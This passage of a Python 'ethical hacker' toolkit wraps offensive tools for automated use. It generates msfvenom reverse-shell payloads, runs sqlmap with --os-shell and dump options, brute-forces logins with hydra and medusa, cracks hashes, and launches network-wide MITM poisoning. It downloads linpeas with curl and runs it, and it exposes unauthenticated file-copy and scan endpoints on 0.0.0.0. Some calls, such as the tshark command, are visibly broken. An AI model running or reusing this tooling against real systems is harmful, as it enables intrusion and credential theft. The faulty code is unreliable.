            vectors.append({"type": "cron", "description": "Cron jobs present", "severity": "MEDIUM"})
        
        return {
            "vectors": vectors,
            "count": len(vectors),
            "recommendation": "Review and secure identified vectors" if vectors else "No obvious vectors found"
        }
    
    def msfvenom_generate(self, payload: str, lhost: str, lport: int, 
                         format: str = "elf", output: str = "/tmp/shell.bin") -> str:
        """Generate payload with msfvenom"""
        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", 
               "-f", format, "-o", output]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return output if result.returncode == 0 else f"Failed: {result.stderr}"
    
    def searchsploit(self, query: str) -> List[Dict]:
        """Search Exploit-DB"""
        cmd = ["searchsploit", query, "--nocolour"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        exploits = []
        for line in result.stdout.split('\n'):
            if '/' in line and '[*]' not in line:
                exploits.append({"path": line.strip()})
        return exploits
    
    # =========================================================================
    # AUDIO & VOICE
    # =========================================================================
    
    def text_to_speech(self, text: str, output: Optional[str] = None) -> str:
        """Text to speech"""
        if output is None:
            output = "/tmp/output.wav"
        cmd = ["espeak", "-w", output, text]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return output if result.returncode == 0 else "Failed"
    
    def speech_to_text(self, audio_file: str) -> str:
        """Speech to text"""
        cmd = ["whisper", audio_file, "--model", "base"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout
    
    def download_media(self, url: str, output: Optional[str] = None) -> str:
        """Download media from URL"""
        if output is None:
            output = "%(title)s.%(ext)s"
        cmd = ["yt-dlp", "-o", output, url]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout
    
    def extract_audio(self, video_file: str, output: str = "/tmp/audio.mp3") -> str:
        """Extract audio from video"""
        cmd = ["ffmpeg", "-i", video_file, "-vn", "-acodec", "libmp3lame", output, "-y"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return output if result.returncode == 0 else f"Failed: {result.stderr}"
    
    def convert_media(self, input_file: str, output_file: str, format: str = "mp4") -> str:
        """Convert media format"""
        cmd = ["ffmpeg", "-i", input_file, output_file, "-y"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return output_file if result.returncode == 0 else f"Failed: {result.stderr}"
    
    def video_thumbnail(self, video_file: str, timestamp: str = "00:00:01", 
                       output: str = "/tmp/thumb.jpg") -> str:
        """Extract video thumbnail"""
        cmd = ["ffmpeg", "-ss", timestamp, "-i", video_file, "-vframes", "1", output, "-y"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return output if result.returncode == 0 else f"Failed: {result.stderr}"
    
    def record_audio(self, duration: int = 5, output: str = "/tmp/recording.wav") -> str:
        """Record audio from microphone"""
        cmd = ["arecord", "-d", str(duration), "-f", "cd", "-w", output]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return output if result.returncode == 0 else f"Failed: {result.stderr}"
    
    # =========================================================================
    # DOCUMENT GENERATION
    # =========================================================================
    
    def create_excel(self, data: List[Dict], output: str = "/tmp/report.xlsx") -> str:
        """Create Excel file"""
        try:
            from openpyxl import Workbook
            wb = Workbook()
            ws = wb.active
            
            if not data:
                wb.save(output)
                return output
            
            headers = list(data[0].keys())
            for col, header in enumerate(headers, 1):
                ws.cell(row=1, column=col, value=header)
            
            for row_num, row_data in enumerate(data, 2):
                for col, header in enumerate(headers, 1):
                    ws.cell(row=row_num, column=col, value=str(row_data.get(header, "")))
            
            wb.save(output)
            return output
        except ImportError:
            return "openpyxl not installed"
    
    def create_word(self, title: str, content: str, output: str = "/tmp/report.docx") -> str:
        """Create Word document"""
        try:
            from docx import Document
            doc = Document()
            doc.add_heading(title, 0)
            doc.add_paragraph(content)
            doc.save(output)
            return output
        except ImportError:
            return "python-docx not installed"
    
    def generate_report(self, title: str, data: Dict, output_format: str = "both") -> Dict:
        """Generate comprehensive report"""
        results = {}
        
        if output_format in ["excel", "both"]:
            excel_data = [{"metric": k, "value": str(v)} for k, v in data.items()]
            results["excel"] = self.create_excel(excel_data)
        
        if output_format in ["word", "both"]:
            content = "\n".join([f"{k}: {v}" for k, v in data.items()])
            results["word"] = self.create_word(title, content)
        
        return results
    
    # =========================================================================
    # API SERVER
    # =========================================================================
    
    def create_api_app(self):
        """Create Flask API application"""
        from flask import Flask, jsonify, request
        
        app = Flask(__name__)
        
        @app.route('/')
        def index():
            return jsonify({
                "name": "Sharingan OS API",
                "version": VERSION,
                "status": "operational"
            })
        
        @app.route('/api/v1/health')
        def health():
            return jsonify({
                "status": "healthy",
                "timestamp": datetime.now().isoformat()
            })
        
        @app.route('/api/v1/system/analyze', methods=['POST'])
        def system_analyze():
            metrics = self.monitor_system(interval=1, count=1)[0]
            return jsonify(metrics)
        
        @app.route('/api/v1/ai/chat', methods=['POST'])
        def ai_chat():
            data = request.json
            message = data.get('message', '')
            response = self.ai_chat(message)
            return jsonify({"response": response})
        
        @app.route('/api/v1/files/copy', methods=['POST'])
        def files_copy():
            data = request.json
            if not data:
                return jsonify({"success": False, "error": "No data provided"})
            src = data.get('src')
            dst = data.get('dst')
            if not src or not dst:
                return jsonify({"success": False, "error": "Missing src or dst"})
            success = self.copy_file(src, dst)
            return jsonify({"success": success})
        
        @app.route('/api/v1/n8n/scan', methods=['POST'])
        def n8n_scan():
            data = request.json
            if not data:
                return jsonify({"result": "No data provided"})
            target = data.get('target', 'localhost')
            result = self.nmap_scan(target)
            return jsonify({"result": result})
        
        return app
    
    def ffuf_scan(self, url: str, wordlist: str, param: str = "FUZZ", method: str = "GET",
                   data: Optional[str] = None, headers: Optional[Dict] = None,
                   threads: int = 40) -> List[Dict]:
        """Fuzzing with FFUF"""
        cmd = ["ffuf", "-u", url.replace("FUZZ", param), "-w", wordlist, "-t", str(threads)]
        if method != "GET" and data:
            cmd.extend(["-X", method, "-d", data])
        elif method != "GET":
            cmd.extend(["-X", method])
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])

        result = subprocess.run(cmd, capture_output=True, text=True)
        findings = []
        for line in result.stdout.split('\n'):
            if "Status:" in line or "Size:" in line:
                findings.append(line.strip())
        return findings

    def dirsearch(self, url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt",
                  threads: int = 25, extensions: Optional[List[str]] = None) -> List[Dict]:
        """Directory scanner with dirsearch"""
        cmd = ["dirsearch", "-u", url, "-w", wordlist, "-t", str(threads)]
        if extensions:
            cmd.extend(["-e", ",".join(extensions)])

        result = subprocess.run(cmd, capture_output=True, text=True)
        found = []
        for line in result.stdout.split('\n'):
            if "200" in line or "301" in line or "302" in line or "403" in line:
                parts = line.split()
                if len(parts) >= 2:
                    found.append({"url": parts[0], "status": parts[1]})
        return found

    # =========================================================================
    # WEB VULNERABILITY SCANNING
    # =========================================================================

    def sqlmap_scan(self, url: str, data: Optional[str] = None, cookies: Optional[str] = None,
                    level: int = 1, risk: int = 1, technique: str = "BEUSTQ",
                    dbms: Optional[str] = None, tables: bool = False, columns: bool = False,
                    dump: bool = False, os_shell: bool = False, threads: int = 1) -> Dict:
        """SQL Injection automation with SQLMap"""
        cmd = ["sqlmap", "-u", url, "--level", str(level), "--risk", str(risk)]
        if data:
            cmd.extend(["--data", data])
        if cookies:
            cmd.extend(["--cookies", cookies])
        if dbms:
            cmd.extend(["--dbms", dbms])
        if tables:
            cmd.append("--tables")
        if columns:
            cmd.append("--columns")
        if dump:
            cmd.append("--dump")
        if os_shell:
            cmd.append("--os-shell")
        cmd.extend(["--threads", str(threads), "--batch"])

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        return {
            "output": result.stdout,
            "errors": result.stderr,
            "vulnerabilities": [] if "you tried to" not in result.stdout else ["SQL Injection possible"]
        }

    def xsstrike_scan(self, url: str, data: Optional[str] = None, param: str = "param",
                      depth: int = 2, payloads: Optional[List[str]] = None) -> List[Dict]:
        """XSS Scanner with XSStrike"""
        cmd = ["xsstrike", "-u", url]
        if data:
            cmd.extend(["--data", data])
        cmd.extend(["--param", param, "-d", str(depth)])

        result = subprocess.run(cmd, capture_output=True, text=True)
        vulnerabilities = []
        for line in result.stdout.split('\n'):
            if "Vulnerable" in line or "XSS" in line:
                vulnerabilities.append({"type": "XSS", "detail": line.strip()})
        return vulnerabilities

    def nikto_scan(self, host: str, port: int = 80, ssl: bool = False,
                   timeout: int = 30) -> List[Dict]:
        """Web vulnerability scanner with Nikto"""
        scheme = "https" if ssl else "http"
        cmd = ["nikto", "-host", f"{scheme}://{host}:{port}", "-timeout", str(timeout)]
        if ssl:
            cmd.append("-ssl")

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+10)
        findings = []
        for line in result.stdout.split('\n'):
            if "+" in line and ("OSVDB" in line or "server" in line or "vulnerability" in line):
                findings.append({"issue": line.strip()})
        return findings

    def nuclei_scan(self, target: str, templates: Optional[List[str]] = None,
                    severity: Optional[List[str]] = None, tags: Optional[List[str]] = None,
                    rate_limit: int = 150) -> List[Dict]:
        """Template-based scanner with Nuclei"""
        cmd = ["nuclei", "-u", target, "-rl", str(rate_limit), "-c", "1"]
        if templates:
            cmd.extend(["-t", ",".join(templates)])
        if severity:
            cmd.extend(["-severity", ",".join(severity)])
        if tags:
            cmd.extend(["-tags", ",".join(tags)])
        cmd.append("-json")

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        findings = []
        for line in result.stdout.split('\n'):
            if line.strip():
                try:
                    findings.append(json.loads(line))
                except:
                    pass
        return findings

    # =========================================================================
    # PASSWORD CRACKING
    # =========================================================================

    def hashcat_crack(self, hash_file: str, wordlist: str, hash_type: int = 0,
                      attack_mode: int = 0, rules: Optional[str] = None,
                      mask: Optional[str] = None, increment: bool = True,
                      max_runtime: int = 3600, output: Optional[str] = None) -> Dict:
        """Password cracking with Hashcat"""
        cmd = ["hashcat", "-m", str(hash_type), "-a", str(attack_mode),
               hash_file, wordlist, "--runtime", str(max_runtime)]
        if rules:
            cmd.extend(["-r", rules])
        if mask:
            cmd.extend(["-a", "3", mask])
        if increment:
            cmd.append("--increment")
        if output:
            cmd.extend(["--outfile", output])
        cmd.append("--batch")

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=max_runtime+60)
        return {
            "output": result.stdout,
            "errors": result.stderr,
            "cracked": result.returncode == 0
        }

    def john_crack(self, hash_file: str, wordlist: Optional[str] = None,
                   format: Optional[str] = None, rules: bool = False,
                   single: bool = False) -> Dict:
        """Password cracking with John the Ripper"""
        cmd = ["john", hash_file]
        if wordlist:
            cmd.extend(["--wordlist", wordlist])
        if format:
            cmd.extend(["--format", format])
        if rules:
            cmd.append("--rules")
        if single:
            cmd.append("--single")

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
        return {
            "output": result.stdout,
            "errors": result.stderr
        }

    def hydra_scan(self, target: str, service: str, user_list: str, pass_list: str,
                   port: Optional[int] = None, ssl: bool = False, threads: int = 16) -> List[Dict]:
        """Online password cracking with Hydra"""
        cmd = ["hydra", "-L", user_list, "-P", pass_list, "-t", str(threads), service]
        if port and service not in ["http-get", "http-post-form"]:
            cmd.extend(["-s", str(port)])
        if ssl:
            cmd.append("-S")
        cmd.append(target)

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        found = []
        for line in result.stdout.split('\n'):
            if "login:" in line and "password:" in line:
                parts = line.split()
                if len(parts) >= 4:
                    found.append({"login": parts[2], "password": parts[4]})
        return found

    def medusa_scan(self, target: str, service: str, user_list: str, pass_list: str,
                    port: Optional[int] = None) -> List[Dict]:
        """Online password cracking with Medusa"""
        cmd = ["medusa", "-h", target, "-U", user_list, "-P", pass_list, "-M", service]
        if port:
            cmd.extend(["-n", str(port)])

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        found = []
        for line in result.stdout.split('\n'):
            if "SUCCESS" in line:
                found.append(line.strip())
        return found

    def crunch_generate(self, min_len: int, max_len: int, charset: str,
                        output: str, prefix: str = "", suffix: str = "") -> bool:
        """Generate wordlist with Crunch"""
        cmd = ["crunch", str(min_len), str(max_len), charset, "-o", output]
        if prefix:
            cmd.extend(["-p", prefix])
        if suffix:
            cmd.extend(["-q", suffix])

        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.returncode == 0

    def cewl_generate(self, url: str, output: str, depth: int = 2,
                      min_word_length: int = 3) -> int:
        """Generate wordlist from website with Cewl"""
        cmd = ["cewl", "-d", str(depth), "-m", str(min_word_length), "-w", output, url]
        result = subprocess.run(cmd, capture_output=True, text=True)

        try:
            with open(output, 'r') as f:
                return len(f.readlines())
        except:
            return 0

    # =========================================================================
    # CRYPTOGRAPHY
    # =========================================================================

    def rsa_ctf_tool(self, attack: str, key_file: str, n: Optional[int] = None,
                     e: Optional[int] = None, c: Optional[int] = None) -> Dict:
        """RSA attacks with RsaCtfTool"""
        cmd = ["python3", "/opt/RsaCtfTool/RsaCtfTool.py", "--attack", attack, "-f", key_file]
        if n:
            cmd.extend(["-n", str(n)])
        if e:
            cmd.extend(["-e", str(e)])
        if c:
            cmd.extend(["-c", str(c)])

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return {
            "output": result.stdout,
            "errors": result.stderr,
            "attack": attack
        }

    def hash_file(self, file_path: str, algorithm: str = "sha256") -> str:
        """Calculate file hash"""
        import hashlib
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
                if algorithm == "md5":
                    return hashlib.md5(content).hexdigest()
                elif algorithm == "sha1":
                    return hashlib.sha1(content).hexdigest()
                elif algorithm == "sha512":
                    return hashlib.sha512(content).hexdigest()
                elif algorithm == "sha3-256":
                    return hashlib.sha3_256(content).hexdigest()
                elif algorithm == "blake2":
                    return hashlib.blake2b(content).hexdigest()
                else:
                    return hashlib.sha256(content).hexdigest()
        except Exception as e:
            logger.error(f"Hash failed: {e}")
            return ""

    # =========================================================================
    # FORENSICS
    # =========================================================================

    def volatility_scan(self, memory_file: str, profile: str = "auto",
                        plugins: Optional[List[str]] = None) -> Dict:
        """Memory forensics with Volatility"""
        cmd = ["volatility", "-f", memory_file]
        if profile != "auto":
            cmd.extend(["--profile", profile])

        results = {}
        default_plugins = ["pslist", "netscan", "malfind", "ldrmodules", "cmdline"]
        plugin_list = plugins if plugins else default_plugins

        for plugin in plugin_list:
            try:
                result = subprocess.run(
                    cmd + ["--plugins", plugin, "shell"],
                    capture_output=True, text=True, timeout=120
                )
                results[plugin] = result.stdout
            except subprocess.TimeoutExpired:
                results[plugin] = "Timeout"
            except Exception as e:
                results[plugin] = f"Error: {str(e)}"

        return results

    def foremost_extract(self, file_path: str, output_dir: str = "recovered",
                         file_types: Optional[List[str]] = None) -> List[str]:
        """File carving with Foremost"""
        cmd = ["foremost", "-i", file_path, "-o", output_dir]
        if file_types:
            cmd.extend(["-t", ",".join(file_types)])

        result = subprocess.run(cmd, capture_output=True, text=True)
        recovered = []
        try:
            for f in os.listdir(output_dir):
                path = os.path.join(output_dir, f)
                if os.path.isfile(path):
                    recovered.append(f)
        except Exception as e:
            logger.error(f"Foremost extraction failed: {e}")
        return recovered

    def steghide_extract(self, image_file: str, password: Optional[str] = None,
                         output: Optional[str] = None) -> List[str]:
        """Extract steganographic data with Steghide"""
        cmd = ["steghide", "extract", "-sf", image_file]
        if password:
            cmd.extend(["-p", password])
        if output:
            cmd.extend(["-xf", output])

        result = subprocess.run(cmd, capture_output=True, text=True)
        if "could not extract" in result.stderr:
            return []
        return [output if output else "extracted data"]

    def exiftool_extract(self, file_path: str, metadata_only: bool = False) -> Dict:
        """Extract metadata with ExifTool"""
        cmd = ["exiftool", file_path]
        if metadata_only:
            cmd.append("-m")

        result = subprocess.run(cmd, capture_output=True, text=True)
        metadata = {}
        for line in result.stdout.split('\n'):
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    metadata[parts[0].strip()] = parts[1].strip()
        return metadata

    # =========================================================================
    # PRIVILEGE ESCALATION
    # =========================================================================

    def linpeas_scan(self, output: str = "/tmp/linpeas.html", quiet: bool = False,
                     color: bool = True) -> Dict:
        """Linux Privilege Escalation Awesome Script"""
        cmd = ["curl", "-L", "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linpeas/linpeas.sh"]
        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode == 0:
            with open("/tmp/linpeas.sh", 'w') as f:
                f.write(result.stdout)

            run_cmd = ["bash", "/tmp/linpeas.sh"]
            if quiet:
                run_cmd.append("-q")
            if not color:
                run_cmd.append("-s")

            run_result = subprocess.run(run_cmd, capture_output=True, text=True, timeout=300)

            with open(output, 'w') as f:
                f.write(f"<pre>{run_result.stdout}</pre>")

            return {
                "output": output,
                "findings": len([l for l in run_result.stdout.split('\n') if 'You can duplicate' in l or 'root' in l])
            }
        return {"error": "Failed to download linpeas"}

    def linux_exploit_suggester(self, kernel: Optional[str] = None,
                                output: str = "json") -> List[Dict]:
        """Suggest Linux kernel exploits"""
        if not kernel:
            try:
                with open('/proc/version', 'r') as f:
                    kernel = f.read().strip()
            except:
                return [{"error": "Could not determine kernel version"}]

        exploits = []
        kernel_exploits = {
            "2.6.32": ["cve-2016-5195", "dirtycow"],
            "3.10": ["cve-2016-5195", "cve-2013-2094"],
            "4.4": ["cve-2016-5195", "cve-2017-6074"],
            "4.14": ["cve-2017-6074", "cve-2019-13272"],
        }

        for ver, exps in kernel_exploits.items():
            if ver in kernel:
                exploits.extend([{"cve": e, "severity": "high"} for e in exps])

        if output == "json":
            return exploits
        return [{"kernel": kernel, "exploits": exploits}]

    # =========================================================================
    # MITM ATTACKS
    # =========================================================================

    def responder(self, interface: str = "eth0", mode: str = "both",
                  whitelist: Optional[List[str]] = None) -> Dict:
        """LLMNR/NBT-NS/mDNS poisoner with Responder"""
        cmd = ["responder", "-I", interface, "-w", "-f"]
        if mode == "forcewpad":
            cmd.append("-f")
        elif mode == "lan":
            cmd.extend(["-b", "-F"])

        if whitelist:
            cmd.extend(["-w", "-P"])
            for ip in whitelist:
                cmd.extend(["-S", ip])

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return {
            "status": "started" if result.returncode == 0 else "failed",
            "interface": interface,
            "mode": mode,
            "output": result.stdout[:500] if result.stdout else result.stderr[:500]
        }

    def bettercap(self, interface: str = "eth0",
                  commands: Optional[List[str]] = None) -> Dict:
        """Modern MITM framework with Bettercap"""
        cmd = ["bettercap", "-iface", interface, "-caplet", "http-ui"]
        if commands:
            cmd.extend(["-eval", "; ".join(commands)])

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return {
            "status": "started" if result.returncode == 0 else "failed",
            "interface": interface,
            "commands": commands,
            "output": result.stdout[:500] if result.stdout else result.stderr[:500]
        }

    def ettercap(self, interface: str = "eth0", targets: str = "0.0.0.0/0",
                 method: str = "unified", plugin: Optional[str] = None) -> Dict:
        """Classic MITM tool with Ettercap"""
        cmd = ["ettercap", "-i", interface, "-M", f"{method}:{targets}"]
        if plugin:
            cmd.extend(["-P", plugin])

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return {
            "status": "started" if result.returncode == 0 else "failed",
            "interface": interface,
            "targets": targets,
            "plugin": plugin,
            "output": result.stdout[:500] if result.stdout else result.stderr[:500]
        }

    def tshark_capture(self, interface: str = "eth0", filter: str = "tcp port 80",
                       count: int = 100, output: str = "/tmp/capture.pcap") -> List[Dict]:
        """Packet capture with TShark"""
        cmd = ["tshark", "-i", interface, "-f", filter, "-c", str(count, "-w", output)]

        result = subprocess.run(cmd, capture_output=True, text=True)
        packets = []
        for line in result.stdout.split('\n'):
            if "TCP" in line or "UDP" in line or "HTTP" in line:
                packets.append({"packet": line.strip()})
        return packets

    def scapy_sniff(self, interface: str = "eth0", filter: str = "tcp",
                    count: int = 100, prn: Optional[Callable] = None) -> List[Any]:
        """Sniffing with Scapy"""
        try:
            from scapy.all import sniff
            packets = sniff(iface=interface, filter=filter, count=count)
            return [p.summary() for p in packets]
        except ImportError:
            return [{"error": "scapy not installed"}]
        except Exception as e:
            return [{"error": str(e)}]

    # =========================================================================
    # MAIN ENTRY POINT
    # =========================================================================
    
    def run(self, args: Optional[List[str]] = None):
        """Main entry point with argparse"""
        import argparse
        
        parser = argparse.ArgumentParser(
            description="Sharingan OS - Ethical Hacker & Full Stack Developer Toolkit",
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
EXAMPLES:
    %(prog)s ai "how to secure Linux server"
    %(prog)s monitor 5 10
    %(prog)s scan 192.168.1.1
    %(prog)s akatsuki deploy Itachi "scan WordPress" http://example.com
    %(prog)s ctf bandit --levels 5
    %(prog)s api --host 0.0.0.0 --port 5000
            """
        )
        
        parser.add_argument('--version', action='version', version=f'%(prog)s {VERSION}')
        
        subparsers = parser.add_subparsers(dest='command', title='commands', metavar='COMMAND')
        
        subparsers.add_parser('ai', help='Chat with AI').add_argument('message', nargs='*', help='Message to send')
        
        monitor_parser = subparsers.add_parser('monitor', help='Monitor system metrics')
        monitor_parser.add_argument('--interval', '-i', type=int, default=5, help='Interval between checks')
        monitor_parser.add_argument('--count', '-c', type=int, default=10, help='Number of checks')
        
        subparsers.add_parser('status', help='Show system status')
        
        scan_parser = subparsers.add_parser('scan', help='Network scanning')
        scan_parser.add_argument('target', help='Target IP or hostname')
        scan_parser.add_argument('--ports', '-p', default='-p-', help='Port range')
        scan_parser.add_argument('--type', '-t', choices=['nmap', 'masscan', 'arp'], default='nmap', help='Scan type')
        
        akatsuki_parser = subparsers.add_parser('akatsuki', help='Akatsuki AI agents')
        akatsuki_sub = akatsuki_parser.add_subparsers(dest='akatsuki_cmd', title='akatsuki commands')
        
        akatsuki_status = akatsuki_sub.add_parser('status', help='Show agent status')
        akatsuki_sub.add_parser('list', help='List available agents')
        
        deploy_parser = akatsuki_sub.add_parser('deploy', help='Deploy an agent')
        deploy_parser.add_argument('agent', help='Agent name (Itachi, Kisame, etc.)')
        deploy_parser.add_argument('task', help='Task to perform')
        deploy_parser.add_argument('--target', help='Target for the task')
        
        ctf_parser = subparsers.add_parser('ctf', help='CTF utilities')
        ctf_sub = ctf_parser.add_subparsers(dest='ctf_cmd', title='ctf commands')
        
        bandit_parser = ctf_sub.add_parser('bandit', help='OverTheWire Bandit solver')
        bandit_parser.add_argument('--levels', '-l', type=int, default=5, help='Number of levels')
        
        natas_parser = ctf_sub.add_parser('natas', help='Natas solver')
        natas_parser.add_argument('level', type=int, help='Natas level')
        
        htb_parser = ctf_sub.add_parser('htb', help='HackTheBox helpers')
        htb_parser.add_argument('--decode', choices=['base64', 'hex', 'rot13', 'url'], help='Decode method')
        htb_parser.add_argument('data', help='Data to decode')
        
        subparsers.add_parser('privesc', help='Check privilege escalation vectors')

        netsentinel_parser = subparsers.add_parser('netsentinel', help='Network intrusion detection')
        netsentinel_parser.add_argument('--interval', '-i', type=int, default=5, help='Check interval in seconds')
        netsentinel_parser.add_argument('--daemon', '-d', action='store_true', help='Run as daemon')

        consciousness_parser = subparsers.add_parser('consciousness', help='System self-awareness AI')
        consciousness_sub = consciousness_parser.add_subparsers(dest='consciousness_cmd', title='consciousness commands')
        consciousness_sub.add_parser('status', help='Show consciousness status')
        consciousness_sub.add_parser('capabilities', help='List all capabilities')
        consciousness_sub.add_parser('reflect', help='Self-reflection')
        consciousness_sub.add_parser('environment', help='Show detected environment')
        analyze_parser = consciousness_sub.add_parser('analyze', help='Analyze situation')
        analyze_parser.add_argument('situation', help='Situation to analyze')
        autonomous_parser = consciousness_sub.add_parser('autonomous', help='Trigger autonomous action')
        autonomous_parser.add_argument('trigger', help='Trigger event')
        
        # COMMANDE DO - Exécution directe d'actions
        do_parser = subparsers.add_parser('do', help='Execute action directly')
        do_sub = do_parser.add_subparsers(dest='do_cmd', title='do commands')
        
        # do scan <target>
        scan_parser = do_sub.add_parser('scan', help='Execute network scan')
        scan_parser.add_argument('target', help='Target IP or range (e.g., 192.168.1.1 or 192.168.1.0/24)')
        scan_parser.add_argument('--type', '-t', choices=['quick', 'full', 'ports'], default='quick', help='Scan type')
        
        # do gobuster <url>
        gobuster_parser = do_sub.add_parser('gobuster', help='Execute gobuster scan')
        gobuster_parser.add_argument('url', help='Target URL')
        gobuster_parser.add_argument('--wordlist', '-w', default='/usr/share/wordlists/dirb/common.txt')
        
        # do lynis (audit système)
        do_sub.add_parser('lynis', help='Run system audit')
        
        api_parser = subparsers.add_parser('api', help='Start API server')
        api_parser.add_argument('--host', default='0.0.0.0', help='Host to bind')
        api_parser.add_argument('--port', '-p', type=int, default=5000, help='Port to listen')
        
        subparsers.add_parser('obligations', help='Check compliance obligations')
        
        web_parser = subparsers.add_parser('web', help='Web utilities')
        web_sub = web_parser.add_subparsers(dest='web_cmd', title='web commands')
        
        gobuster_parser = web_sub.add_parser('dir', help='Directory enumeration')
        gobuster_parser.add_argument('url', help='Target URL')
        gobuster_parser.add_argument('--wordlist', '-w', default='/usr/share/wordlists/dirb/common.txt')
        
        whatweb_parser = web_sub.add_parser('tech', help='Identify technologies')
        whatweb_parser.add_argument('url', help='Target URL')
        
        osint_parser = subparsers.add_parser('osint', help='OSINT utilities')
        osint_sub = osint_parser.add_subparsers(dest='osint_cmd', title='osint commands')
        
        crtsh_parser = osint_sub.add_parser('subdomains', help='Find subdomains via crt.sh')
        crtsh_parser.add_argument('domain', help='Domain to search')
        
        harvester_parser = osint_sub.add_parser('harvest', help='Harvest emails and hosts')
        harvester_parser.add_argument('domain', help='Domain to search')
        
        docker_parser = subparsers.add_parser('docker', help='Docker utilities')
        docker_sub = docker_parser.add_subparsers(dest='docker_cmd', title='docker commands')
        docker_sub.add_parser('ps', help='List containers')
        docker_sub.add_parser('images', help='List images')
        
        if not args:
            args = sys.argv[1:]
        
        parsed = parser.parse_args(args if args else ['--help'])
        
        if parsed.command is None:
            parser.print_help()
            return
        
        try:
            if parsed.command == 'ai':
                message = ' '.join(parsed.message) if parsed.message else "Hello"
                print(self.sharingan_chat(message))
            
            elif parsed.command == 'monitor':
                metrics = self.monitor_system(parsed.interval, parsed.count)
                print(json.dumps(metrics, indent=2))
            
            elif parsed.command == 'status':
                print(f"CPU: {self.get_cpu_usage()}%")
                print(f"Memory: {self.get_memory_usage()}")
                print(f"Disk: {self.get_disk_usage()}")
            
            elif parsed.command == 'scan':
                if parsed.type == 'nmap':
                    print(self.nmap_scan(parsed.target, parsed.ports))
                elif parsed.type == 'masscan':
                    print(self.masscan_scan(parsed.target))
                elif parsed.type == 'arp':
                    print(json.dumps(self.arp_scan(target=parsed.target), indent=2))
            
            elif parsed.command == 'akatsuki':
                if parsed.akatsuki_cmd == 'status':
                    print(json.dumps(self.akatsuki_status(), indent=2))
                elif parsed.akatsuki_cmd == 'list':
                    agents = ['Itachi', 'Kisame', 'Sasori', 'Deidara', 'Hidan', 'Kakuzu', 'Orochimaru', 'Konan', 'Zetsu', 'Tobi']
                    for a in agents:
                        print(f"  - {a}")
                elif parsed.akatsuki_cmd == 'deploy':
                    print(json.dumps(self.akatsuki_deploy(parsed.agent, parsed.task, parsed.target), indent=2))
            
            elif parsed.command == 'ctf':
                if parsed.ctf_cmd == 'bandit':
                    print(json.dumps(self.bandit_solver(levels=parsed.levels), indent=2))
                elif parsed.ctf_cmd == 'natas':
                    print(json.dumps(self.natas_solver(parsed.level), indent=2))
                elif parsed.ctf_cmd == 'htb':
                    if parsed.decode:
                        result = self.hackthebox_solve(parsed.decode, parsed.data)
                        print(json.dumps(result, indent=2))
            
            elif parsed.command == 'privesc':
                print(json.dumps(self.check_privilege_escalation(), indent=2))
            
            elif parsed.command == 'netsentinel':
                import sys as _sys_netsentinel
                _sys_netsentinel.path.insert(0, str(Path(__file__).parent / "tools"))
                from network_monitor import NetSentinel, ai_alert_handler
                print("NetSentinel - Comprehensive System Monitoring & Intrusion Detection")
                print("=" * 60)
                
                if parsed.daemon:
                    sentinel = NetSentinel(alert_callback=ai_alert_handler)
                    sentinel.start_background_monitor(parsed.interval)
                    print(f"Running in daemon mode (interval: {parsed.interval}s)")
                    print("Press Ctrl+C to stop")
                    try:
                        while True: time.sleep(1)
                    except KeyboardInterrupt:
                        sentinel.stop()
                        print("\nNetSentinel stopped.")
                else:
                    import readline
                    sentinel = NetSentinel(alert_callback=ai_alert_handler)
                    print("\nInteractive mode. Commands: status, threats, watch, processes, ports, network, quit")
                    while True:
                        try:
                            cmd = input("\nnetsentinel> ").strip()
                            if cmd in ['quit', 'exit']:
                                break
                            elif cmd == 'status':
                                status = sentinel.get_system_status()
                                print(f"\n[{status['timestamp']}]")
                                print(f"CPU: {status['cpu']['percent']}% | Memory: {status['memory']['percent']}% | Disk: {status['disk']['percent']}%")
                                print(f"Network: {status['network']['bytes_sent_mb']}MB sent, {status['network']['bytes_recv_mb']}MB recv")
                                print(f"Processes: {len(status['processes'])} | Connections: {len(status['connections'])} | Ports: {len(status['listening_ports'])}")
                                print(f"Users: {len(status['users'])}")
                            elif cmd == 'threats':
                                assessment = sentinel.get_threat_assessment()
                                print(f"\nThreat Level: {assessment['threat_level']}")
                                print(f"Anomalies: {assessment['anomalies_count']}")
                                for a in assessment['anomalies']:
                                    print(f"  [{a['severity']}] {a['type']}: {a['details']}")
                            elif cmd == 'watch':
                                interval = parsed.interval
                                print(f"Watching... (interval: {interval}s, Ctrl+C to stop)")
                                try:
                                    while True:
                                        assessment = sentinel.get_threat_assessment()
                                        status = assessment['system_status']
                                        print(f"[{datetime.now().strftime('%H:%M:%S')}] "
                                              f"CPU:{status['cpu']}% MEM:{status['memory']}% "
                                              f"CONN:{status['active_connections']} PORTS:{status['listening_ports']} "
                                              f"THREAT:{assessment['threat_level']}")
                                        time.sleep(interval)
                                except KeyboardInterrupt:
                                    print("\nStopped watching.")
                            elif cmd == 'processes':
                                procs = sentinel.get_process_info()
